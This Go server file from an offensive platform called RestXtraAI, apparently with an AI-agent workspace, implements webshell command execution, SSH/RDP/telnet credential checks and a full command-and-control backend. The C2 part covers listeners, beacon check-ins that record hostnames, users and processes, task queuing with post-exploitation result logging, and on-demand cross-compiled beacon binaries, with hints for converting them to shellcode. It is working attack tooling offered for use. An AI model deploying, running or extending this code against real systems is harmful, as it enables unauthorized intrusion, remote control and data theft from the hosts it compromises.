package server

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/RestXtra/RestXtraAI/db"
	"golang.org/x/crypto/ssh"
)

// 平台扩展能力：工作空间（文件浏览）、知识库、WebShell、C2。
// WebShell / C2 / 知识库 模块，落地为可用 v1。

// ---------- 工作空间（共享工作目录浏览） ----------

// workspaceRoot 是 agent 写入中间产物的共享目录（dataDir）。
func (s *Server) workspaceRoot() string { return s.m.dir }

// safeWorkspacePath 把相对路径限制在工作空间根内，防目录穿越。
func (s *Server) safeWorkspacePath(rel string) (string, error) {
	root := s.workspaceRoot()
	p := filepath.Join(root, filepath.Clean("/"+rel))
	if p != root && !strings.HasPrefix(p, root+string(filepath.Separator)) {
		return "", fmt.Errorf("路径越界")
	}
	return p, nil
}

func (s *Server) workspaceList(w http.ResponseWriter, r *http.Request) {
	rel := r.URL.Query().Get("path")
	p, err := s.safeWorkspacePath(rel)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	entries, err := os.ReadDir(p)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	out := make([]map[string]any, 0, len(entries))
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		if info != nil {
			size = info.Size()
		}
		out = append(out, map[string]any{
			"name": e.Name(), "dir": e.IsDir(), "size": size,
			"mod": func() int64 {
				if info != nil {
					return info.ModTime().Unix()
				}
				return 0
			}(),
		})
	}
	writeJSON(w, 200, map[string]any{"path": filepath.Clean("/" + rel), "entries": out})
}

func (s *Server) workspaceRead(w http.ResponseWriter, r *http.Request) {
	rel := r.URL.Query().Get("path")
	p, err := s.safeWorkspacePath(rel)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	fi, err := os.Stat(p)
	if err != nil || fi.IsDir() {
		writeErr(w, 404, "not a file")
		return
	}
	if fi.Size() > 1<<20 {
		writeErr(w, 413, "文件过大（>1MB）")
		return
	}
	b, err := os.ReadFile(p)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"path": filepath.Clean("/" + rel), "content": string(b)})
}

// workspaceDelete 删除工作空间内的文件或目录（相对路径，防穿越）。
func (s *Server) workspaceDelete(w http.ResponseWriter, r *http.Request) {
	rel := r.URL.Query().Get("path")
	p, err := s.safeWorkspacePath(rel)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if p == s.workspaceRoot() {
		writeErr(w, 400, "不能删除工作空间根目录")
		return
	}
	fi, err := os.Stat(p)
	if err != nil {
		writeErr(w, 404, "not found")
		return
	}
	if fi.IsDir() {
		if err := os.RemoveAll(p); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
	} else {
		if err := os.Remove(p); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
	}
	writeJSON(w, 200, map[string]any{"deleted": filepath.Clean("/" + rel)})
}

// workspaceClear 批量清理工作空间：可选的保留清单（白名单，按名称精确匹配），
// 其余全部删除。白名单默认保留：日志、会话记录、配置等关键运行产物。
func (s *Server) workspaceClear(w http.ResponseWriter, r *http.Request) {
	keep := map[string]bool{}
	for _, k := range []string{"backend.out.log", "backend.err.log", "backend-linux.out.log", "backend-linux.err.log", "transcripts", "sessions", "config.json", "restxtra.json"} {
		keep[k] = true
	}
	var req struct {
		Keep []string `json:"keep"` // 可选：额外保留的条目名
	}
	_ = decode(r, &req)
	for _, k := range req.Keep {
		keep[k] = true
	}
	root := s.workspaceRoot()
	entries, err := os.ReadDir(root)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var removed []string
	for _, e := range entries {
		if keep[e.Name()] {
			continue
		}
		full := filepath.Join(root, e.Name())
		if e.IsDir() {
			_ = os.RemoveAll(full)
		} else {
			_ = os.Remove(full)
		}
		removed = append(removed, e.Name())
	}
	writeJSON(w, 200, map[string]any{"removed": removed, "kept": func() []string {
		var ks []string
		for k := range keep {
			ks = append(ks, k)
		}
		return ks
	}()})
}

// ---------- 知识库 ----------

func (s *Server) knowledgeList(w http.ResponseWriter, r *http.Request) {
	items, err := s.m.pg.ListKnowledge(300)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}

func (s *Server) knowledgeSearch(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Q     string `json:"q"`
		Limit int    `json:"limit"`
	}
	_ = decode(r, &req)
	items, err := s.m.pg.SearchKnowledge(req.Q, req.Limit)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}

func (s *Server) knowledgeSave(w http.ResponseWriter, r *http.Request) {
	var k db.KnowledgeItem
	if err := decode(r, &k); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(k.Title) == "" {
		writeErr(w, 400, "标题必填")
		return
	}
	id, err := s.m.pg.SaveKnowledge(&k)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) knowledgeDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteKnowledge(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// ---------- WebShell ----------

func (s *Server) webshellList(w http.ResponseWriter, r *http.Request) {
	conns, err := s.m.pg.ListWebshells()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"connections": conns})
}

func (s *Server) webshellSave(w http.ResponseWriter, r *http.Request) {
	var c db.WebshellConn
	if err := decode(r, &c); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(c.Name) == "" || strings.TrimSpace(c.URL) == "" {
		writeErr(w, 400, "名称与 URL 必填")
		return
	}
	id, err := s.m.pg.SaveWebshell(&c)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) webshellDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteWebshell(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// webshellDeleteBatch removes multiple (or all) webshell connections.
func (s *Server) webshellDeleteBatch(w http.ResponseWriter, r *http.Request) {
	var req struct {
		IDs []int64 `json:"ids"`
		All bool    `json:"all"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	var n int64
	var err error
	if req.All {
		n, err = s.m.pg.ClearWebshells()
	} else {
		n, err = s.m.pg.DeleteWebshells(req.IDs)
	}
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": n})
}

// webshellExec 向 webshell 发送一条任意命令，返回原始输出 + HTTP 状态码。
func webshellExec(host, shellType, password, headers, cmd string) (string, int, error) {
	if strings.TrimSpace(host) == "" {
		return "", 0, fmt.Errorf("URL 必填")
	}
	client := &http.Client{Timeout: 20 * time.Second}
	var body io.Reader
	var req *http.Request
	var err error
	u := host
	switch shellType {
	case "php", "jsp", "aspx", "asp":
		q := url.Values{}
		q.Set("cmd", cmd)
		if password != "" {
			q.Set("pwd", password)
		}
		sep := "?"
		if strings.Contains(u, "?") {
			sep = "&"
		}
		req, err = http.NewRequest(http.MethodGet, u+sep+q.Encode(), nil)
	default: // generic：JSON POST
		payload, _ := json.Marshal(map[string]string{"cmd": cmd})
		body = strings.NewReader(string(payload))
		req, err = http.NewRequest(http.MethodPost, u, body)
		req.Header.Set("Content-Type", "application/json")
	}
	if err != nil {
		return "", 0, err
	}
	var hdr map[string]string
	_ = json.Unmarshal([]byte(headers), &hdr)
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	return string(b), resp.StatusCode, nil
}

// testWebshellConn 通过 HTTP 向 webshell 发一条 ping 命令验证连通性。
func testWebshellConn(host, shellType, password, headers string) map[string]any {
	marker := "RESTXTRA_WS_OK"
	out, status, err := webshellExec(host, shellType, password, headers, "echo "+marker)
	if err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	ok := strings.Contains(out, marker)
	return map[string]any{"ok": ok, "status": status, "snippet": firstLine(out, 200)}
}

// webshellTest 通过 HTTP 向 webshell 发一条 ping 命令验证连通性。
func (s *Server) webshellTest(w http.ResponseWriter, r *http.Request) {
	var c db.WebshellConn
	if err := decode(r, &c); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, testWebshellConn(c.URL, c.Type, c.Password, c.Headers))
}

// ---------- Connection（统一连接管理）----------

func (s *Server) connectionList(w http.ResponseWriter, r *http.Request) {
	kind := r.URL.Query().Get("kind")
	conns, err := s.m.pg.ListConnections(kind)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"connections": conns})
}

func (s *Server) connectionSave(w http.ResponseWriter, r *http.Request) {
	var c db.Connection
	if err := decode(r, &c); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(c.Name) == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	if c.Kind == "" {
		c.Kind = "webshell"
	}
	id, err := s.m.pg.SaveConnection(&c)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) connectionDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteConnection(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

func (s *Server) connectionDeleteBatch(w http.ResponseWriter, r *http.Request) {
	var req struct {
		IDs []int64 `json:"ids"`
		All bool    `json:"all"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	var n int64
	var err error
	if req.All {
		n, err = s.m.pg.ClearConnections()
	} else {
		n, err = s.m.pg.DeleteConnections(req.IDs)
	}
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": n})
}

// testSSH 通过 x/crypto/ssh 登录并执行标记命令验证连通性（无需新增依赖）。
func testSSH(c db.Connection) map[string]any {
	if c.Host == "" {
		return map[string]any{"ok": false, "error": "host 必填"}
	}
	port := c.Port
	if port == 0 {
		port = 22
	}
	user := c.Username
	if user == "" {
		user = "root"
	}
	var cfg struct {
		PrivateKey string `json:"private_key"`
	}
	_ = json.Unmarshal(c.Config, &cfg)
	auth := []ssh.AuthMethod{}
	if cfg.PrivateKey != "" {
		signer, err := ssh.ParsePrivateKey([]byte(cfg.PrivateKey))
		if err != nil {
			return map[string]any{"ok": false, "error": "私钥解析失败: " + err.Error()}
		}
		auth = append(auth, ssh.PublicKeys(signer))
	}
	if c.Secret != "" {
		auth = append(auth, ssh.Password(c.Secret))
	}
	if len(auth) == 0 {
		return map[string]any{"ok": false, "error": "未配置密码或私钥"}
	}
	sshCfg := &ssh.ClientConfig{
		User:            user,
		Auth:            auth,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", c.Host, port), sshCfg)
	if err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	defer sess.Close()
	out, err := sess.CombinedOutput("echo RESTXTRA_SSH_OK")
	if err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	ok := strings.Contains(string(out), "RESTXTRA_SSH_OK")
	return map[string]any{"ok": ok, "output": firstLine(string(out), 200)}
}

// rdpTestResult 通过 grdp NLA auth-only 验证 RDP 凭据。
func rdpTestResult(c db.Connection) map[string]any {
	if c.Host == "" {
		return map[string]any{"ok": false, "error": "host 必填"}
	}
	if err := rdpCredentialCheck(c.Host, c.Port, c.Username, c.Secret); err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	return map[string]any{"ok": true}
}

// telnetTestResult 通过 go-telnet 连接并回显标记验证连通性。
func telnetTestResult(c db.Connection) map[string]any {
	if c.Host == "" {
		return map[string]any{"ok": false, "error": "host 必填"}
	}
	out, err := telnetRun(c.Host, c.Port, "echo RESTXTRA_TELNET_OK", 6*time.Second)
	if err != nil {
		return map[string]any{"ok": false, "error": err.Error()}
	}
	ok := strings.Contains(out, "RESTXTRA_TELNET_OK")
	return map[string]any{"ok": ok, "snippet": firstLine(out, 200)}
}

// connectionTest 按 kind 验证连接可用性。webshell 走 HTTP 探测；ssh 走 x/crypto/ssh 登录；
// rdp 走 grdp NLA 验凭据；telnet 走 go-telnet 连接（见 docs/connection-management-design.md §15）。
func (s *Server) connectionTest(w http.ResponseWriter, r *http.Request) {
	var c db.Connection
	if err := decode(r, &c); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	switch c.Kind {
	case "ssh":
		writeJSON(w, 200, testSSH(c))
	case "rdp":
		writeJSON(w, 200, rdpTestResult(c))
	case "telnet":
		writeJSON(w, 200, telnetTestResult(c))
	default: // webshell
		var cfg struct {
			Type    string `json:"type"`
			Headers string `json:"headers"`
		}
		_ = json.Unmarshal(c.Config, &cfg)
		if cfg.Headers == "" {
			cfg.Headers = "{}"
		}
		writeJSON(w, 200, testWebshellConn(c.Host, cfg.Type, c.Secret, cfg.Headers))
	}
}

// ---------- C2 ----------

func (s *Server) c2List(w http.ResponseWriter, r *http.Request) {
	listeners, err := s.m.pg.ListC2Listeners()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	// lazy restore: listeners marked running are re-bound on demand after a
	// server restart (mirrors Sliver job persistence).
	if s.c2m != nil {
		for _, l := range listeners {
			if l.Status == "running" && !s.c2m.RunningListener(l.ID) {
				if err := s.c2m.StartListener(l); err != nil {
					_ = s.m.pg.SetC2ListenerStatus(l.ID, "error", err.Error())
					l.Status = "error"
				} else {
					l.Status = "running"
				}
			}
		}
	}
	sessions, err := s.m.pg.ListC2Sessions(200)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"listeners": listeners, "sessions": sessions})
}

func (s *Server) c2SaveListener(w http.ResponseWriter, r *http.Request) {
	var l db.C2Listener
	if err := decode(r, &l); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(l.Name) == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	id, err := s.m.pg.SaveC2Listener(&l)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) c2DeleteListener(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Listener(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// c2DeleteListenersBatch removes multiple (or all) C2 listeners.
func (s *Server) c2DeleteListenersBatch(w http.ResponseWriter, r *http.Request) {
	var req struct {
		IDs []int64 `json:"ids"`
		All bool    `json:"all"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	var n int64
	var err error
	if req.All {
		n, err = s.m.pg.ClearC2Listeners()
	} else {
		n, err = s.m.pg.DeleteC2Listeners(req.IDs)
	}
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": n})
}

// c2DeleteSessionsBatch removes multiple (or all) C2 beacon sessions.
func (s *Server) c2DeleteSessionsBatch(w http.ResponseWriter, r *http.Request) {
	var req struct {
		IDs []int64 `json:"ids"`
		All bool    `json:"all"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	var n int64
	var err error
	if req.All {
		n, err = s.m.pg.ClearC2Sessions()
	} else {
		n, err = s.m.pg.DeleteC2Sessions(req.IDs)
	}
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": n})
}

// c2Ingest 是 beacon 心跳入口：upsert 会话（富化客户端信息）。
func (s *Server) c2Ingest(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ListenerID  *int64 `json:"listener_id"`
		SessionID   string `json:"session_id"`
		Host        string `json:"host"`
		RemoteIP    string `json:"remote_ip"`
		Location    string `json:"location"`
		Hostname    string `json:"hostname"`
		Username    string `json:"username"`
		UID         string `json:"uid"`
		GID         string `json:"gid"`
		OS          string `json:"os"`
		Arch        string `json:"arch"`
		PID         int32  `json:"pid"`
		ProcessName string `json:"process_name"`
		Connection  string `json:"connection"`
		Note        string `json:"note"`
		Meta        string `json:"meta"`
		Status      string `json:"status"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(req.SessionID) == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	if err := s.m.pg.UpsertC2Session(&db.C2Session{
		ListenerID:  req.ListenerID,
		SessionID:   req.SessionID,
		Host:        req.Host,
		RemoteIP:    req.RemoteIP,
		Location:    req.Location,
		Hostname:    req.Hostname,
		Username:    req.Username,
		UID:         req.UID,
		GID:         req.GID,
		OS:          req.OS,
		Arch:        req.Arch,
		PID:         req.PID,
		ProcessName: req.ProcessName,
		Connection:  req.Connection,
		Note:        req.Note,
		Meta:        req.Meta,
		Status:      req.Status,
	}); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

func (s *Server) c2SetStatus(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SessionID string `json:"session_id"`
		Status    string `json:"status"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if err := s.m.pg.SetC2SessionStatus(req.SessionID, req.Status); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// c2SetNote 更新会话备注。
func (s *Server) c2SetNote(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SessionID string `json:"session_id"`
		Note      string `json:"note"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if err := s.m.pg.UpdateC2SessionNote(req.SessionID, req.Note); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// c2ListenerSetStatus 更新监听器运行状态（running|stopped|error）。
func (s *Server) c2ListenerSetStatus(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	var req struct {
		Status string `json:"status"`
		Error  string `json:"error"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if req.Status == "" {
		req.Status = "stopped"
	}
	if err := s.m.pg.SetC2ListenerStatus(id, req.Status, req.Error); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// ---------- C2 Profiles ----------

func (s *Server) c2ProfilesList(w http.ResponseWriter, r *http.Request) {
	profiles, err := s.m.pg.ListC2Profiles()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"profiles": profiles})
}

func (s *Server) c2ProfileSave(w http.ResponseWriter, r *http.Request) {
	var p db.C2Profile
	if err := decode(r, &p); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(p.Name) == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	id, err := s.m.pg.SaveC2Profile(&p)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) c2ProfileDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Profile(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// ---------- C2 Tasks ----------

func (s *Server) c2TasksList(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("sid")
	tasks, err := s.m.pg.ListC2Tasks(sid, 100)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tasks": tasks})
}

func (s *Server) c2TaskCreate(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("sid")
	var req struct {
		Command     string          `json:"command"`
		Description string          `json:"description"`
		Request     json.RawMessage `json:"request"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令必填")
		return
	}
	id, err := s.m.pg.CreateC2Task(sid, req.Command, req.Description, req.Request)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

// c2TaskResult 是 beacon 回传任务结果入口。
func (s *Server) c2TaskResult(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	var req struct {
		State    string          `json:"state"`
		Response json.RawMessage `json:"response"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if req.State == "" {
		req.State = "completed"
	}
	if err := s.m.pg.UpdateC2TaskResult(id, req.State, req.Response); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if t, err := s.m.pg.GetC2TaskByID(id); err == nil && t != nil {
		s.logPostexKnowledge(t)
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

func (s *Server) c2TaskDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Task(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// ---------- C2 Auto Tasks ----------

func (s *Server) c2AutoTasksList(w http.ResponseWriter, r *http.Request) {
	tasks, err := s.m.pg.ListC2AutoTasks()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"auto_tasks": tasks})
}

func (s *Server) c2AutoTaskSave(w http.ResponseWriter, r *http.Request) {
	var a db.C2AutoTask
	if err := decode(r, &a); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(a.Name) == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	id, err := s.m.pg.SaveC2AutoTask(&a)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

func (s *Server) c2AutoTaskDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2AutoTask(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// ---------- C2 Listener Runtime ----------

func (s *Server) c2ListenerStart(w http.ResponseWriter, r *http.Request) {
	if s.c2m == nil {
		writeErr(w, 500, "C2 运行时未初始化")
		return
	}
	id, _ := pathInt(r, "id")
	listeners, err := s.m.pg.ListC2Listeners()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var l *db.C2Listener
	for _, x := range listeners {
		if x.ID == id {
			l = x
			break
		}
	}
	if l == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	if err := s.c2m.StartListener(l); err != nil {
		_ = s.m.pg.SetC2ListenerStatus(id, "error", err.Error())
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true, "status": "running"})
}

func (s *Server) c2ListenerStop(w http.ResponseWriter, r *http.Request) {
	if s.c2m == nil {
		writeErr(w, 500, "C2 运行时未初始化")
		return
	}
	id, _ := pathInt(r, "id")
	if err := s.c2m.StopListener(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true, "status": "stopped"})
}

// ---------- C2 Client Generation ----------

func (s *Server) c2GeneratedList(w http.ResponseWriter, r *http.Request) {
	items, err := s.m.pg.ListC2Generated()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"generated": items})
}

// c2GeneratedCreate builds a beacon for the chosen OS/arch + listener. When the
// server runs from source with a Go toolchain it cross-compiles a real binary
// (config embedded via ldflags) and serves it for download; otherwise it falls
// back to returning the connection config + build instructions.
func (s *Server) c2GeneratedCreate(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name       string `json:"name"`
		ListenerID int64  `json:"listener_id"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		Format     string `json:"format"` // stageless|dll|shellcode|config
		Host       string `json:"host"`   // reachable teamserver address override
		Interval   int    `json:"interval"`
		Jitter     int    `json:"jitter"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if req.Name == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	if req.OS == "" {
		req.OS = "linux"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}
	if req.Format == "" {
		req.Format = "stageless"
	}
	if req.Interval <= 0 {
		req.Interval = 5
	}
	if req.Jitter < 0 {
		req.Jitter = 20
	}
	listeners, err := s.m.pg.ListC2Listeners()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var l *db.C2Listener
	for _, x := range listeners {
		if x.ID == req.ListenerID {
			l = x
			break
		}
	}
	if l == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	host := req.Host
	if host == "" {
		host = l.Host
	}
	if host == "0.0.0.0" || host == "" {
		host = localIP()
	}
	sid := randomHex(16)

	buildCmd := fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -o beacon ./cmd/beacon", req.OS, req.Arch)
	runCmd := "./beacon"
	scheme := "http"
	if l.Protocol == "https" {
		scheme = "https"
	}

	id, err := s.m.pg.SaveC2Generated(&db.C2Generated{
		Name: req.Name, ListenerID: &l.ID, OS: req.OS, Arch: req.Arch, Format: req.Format,
		Config: s.c2GeneratedConfig(scheme, host, l.Port, req.Format, sid, req.Interval, req.Jitter),
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}

	// shellcode needs an external Donut/SRDI toolchain — surface clear guidance.
	if req.Format == "shellcode" {
		writeJSON(w, 200, map[string]any{
			"id": id, "session_id": sid, "format": req.Format,
			"message":       "shellcode 生成需要外部 Donut/SRDI 工具链，请先用 stageless 生成可执行文件，或用 donut 将可执行文件转为 shellcode。",
			"build_command": buildCmd, "run_command": runCmd,
			"download_url": "", "built": false,
		})
		return
	}

	// attempt on-demand cross-compile when a toolchain is available
	if _, _, ok := s.c2BuildEnv(); ok && req.Format != "config" {
		cfgRaw, _ := json.Marshal(map[string]any{
			"server_url": fmt.Sprintf("%s://%s:%d", scheme, host, l.Port), "session_id": sid,
			"interval": req.Interval, "jitter": req.Jitter,
			"register_uri": "/register", "poll_uri": "/poll", "result_uri": "/result", "format": req.Format,
		})
		path, size, err := s.buildBeaconArtifact(id, req.OS, req.Arch, req.Format, cfgRaw)
		if err != nil {
			writeJSON(w, 200, map[string]any{
				"id": id, "session_id": sid, "format": req.Format,
				"message":       "构建失败（" + err.Error() + "），可改用「复制配置」模式或本地构建。",
				"build_command": buildCmd, "run_command": runCmd,
				"download_url": "", "built": false,
			})
			return
		}
		if err := s.m.pg.UpdateC2GeneratedArtifact(id, path, size); err == nil {
			writeJSON(w, 200, map[string]any{
				"id":            id,
				"session_id":    sid,
				"format":        req.Format,
				"download_url":  fmt.Sprintf("/api/c2/generated/%d/download", id),
				"size":          size,
				"built":         true,
				"build_command": buildCmd, "run_command": runCmd,
			})
			return
		}
	}

	writeJSON(w, 200, map[string]any{
		"id": id, "session_id": sid, "format": req.Format,
		"message":       "未检测到 Go 工具链/beacon 源码，已生成配置；请在源码目录本地构建。",
		"build_command": buildCmd, "run_command": runCmd,
		"download_url": "", "built": false,
	})
}

// c2GeneratedDownload serves the built beacon artifact.
func (s *Server) c2GeneratedDownload(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	g, err := s.m.pg.GetC2Generated(id)
	if err != nil || g == nil {
		writeErr(w, 404, "生成记录不存在")
		return
	}
	if g.Artifact == "" {
		writeErr(w, 404, "尚未生成可下载文件")
		return
	}
	st, err := os.Stat(g.Artifact)
	if err != nil {
		writeErr(w, 500, "产物文件不存在")
		return
	}
	base := filepath.Base(g.Artifact)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", base))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", st.Size()))
	http.ServeFile(w, r, g.Artifact)
}

func (s *Server) c2GeneratedDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Generated(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// ---------- C2 Plugins ----------

func (s *Server) c2PluginsList(w http.ResponseWriter, r *http.Request) {
	items, err := s.m.pg.ListC2Plugins()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"plugins": items})
}

func (s *Server) c2PluginSave(w http.ResponseWriter, r *http.Request) {
	var p db.C2Plugin
	if err := decode(r, &p); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(p.Name) == "" {
		writeErr(w, 400, "名称必填")
		return
	}
	id, err := s.m.pg.SaveC2Plugin(&p)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

